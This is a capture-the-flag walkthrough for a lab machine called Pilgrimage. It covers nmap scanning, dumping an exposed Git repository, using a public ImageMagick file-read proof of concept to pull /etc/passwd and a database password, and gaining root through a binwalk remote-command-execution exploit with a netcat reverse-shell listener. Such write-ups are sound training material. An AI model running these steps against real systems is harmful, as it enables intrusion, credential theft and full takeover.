<h1 align="center">
  <br>
  <img src="assets/Pilgrimage.png" alt="HideNSeek" width="100">
  <br>
  <br>
  <span>Pilgrimage</span>
</h1>

# Scanning
Nmap Scan
```
nmap -sC -sV -A -T4 10.10.11.219
```

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 20:be:60:d2:95:f6:28:c1:b7:e9:e8:17:06:f1:68:f3 (RSA)
|   256 0e:b6:a6:a8:c9:9b:41:73:74:6e:70:18:0d:5f:e0:af (ECDSA)
|_  256 d1:4e:29:3c:70:86:69:b4:d7:2c:c8:0b:48:6e:98:04 (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-title: Pilgrimage - Shrink Your Images
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-git: 
|   10.10.11.219:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: Pilgrimage image shrinking service initial commit. # Please ...
|_http-server-header: nginx/1.18.0
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

From the result we can see that port 22 and 80 is opened and that the Git repository for the web application is exposed, we can extract it with [Git Dumper](https://github.com/arthaud/git-dumper)

```
python3 git_dumper.py http://pilgrimage.htb/.git/ Dump
```
When looking through the files we find this line indicating that the page uses ImageMagick to shrink images
```php
exec("/var/www/pilgrimage.htb/magick convert /var/www/pilgrimage.htb/tmp/" . $upload->getName() . $mime . " -resize 50% /var/www/pilgrimage.htb/shrunk/" . $newname . $mime);
```

We find this [ImageMagick Vulnerability](https://github.com/Sybil-Scan/imagemagick-lfi-poc) which can read files utilizing this functionality.

# Gaining Access
We use the ImageMagick vulnerability to read ```/etc/passwd``` and find the emily user that we will target ```emily:x:1000:1000:emily,,,:/home/emily:/bin/bash```<br>

Also from the Git dump we find that the application accesses a database ```$db = new PDO('sqlite:/var/db/pilgrimage');```, using the vulnerability we read this file and find the password for emily<br>

We can now connect via ssh ```ssh emily@ip```

# Privilege Escalation
From the ```ps aux``` output we can see an unusual shell script file  being run by root ```/bin/bash /usr/sbin/malwarescan.sh```.
```bash
#!/bin/bash

blacklist=("Executable script" "Microsoft executable")

/usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/ | while read FILE; do
        filename="/var/www/pilgrimage.htb/shrunk/$(/usr/bin/echo "$FILE" | /usr/bin/tail -n 1 | /usr/bin/sed -n -e 's/^.*CREATE //p')"
        binout="$(/usr/local/bin/binwalk -e "$filename")"
        for banned in "${blacklist[@]}"; do
                if [[ "$binout" == *"$banned"* ]]; then
                        /usr/bin/rm "$filename"
                        break
                fi
        done
done
```
As we can see that file uses binwalk on the files that are added to ```/var/www/pilgrimage.htb/shrunk/```<br>
We check the binwalk version to see if it has known vulnerabilities and it has [Binwalk v2.3.2 - Remote Command Execution](https://www.exploit-db.com/exploits/51249)

We create the exploit:
```
python3 51249.py image.png <ip> <port>
```

We need to set up a netcat listener:
```
nc -nvlp <port>
```

We upload the file to ```/var/www/pilgrimage.htb/shrunk/``` using scp:
```
scp binwalk_exploit.png emily@<ip>:/var/www/pilgrimage.htb/shrunk
```
Once the file upload is complete, the connection should be established



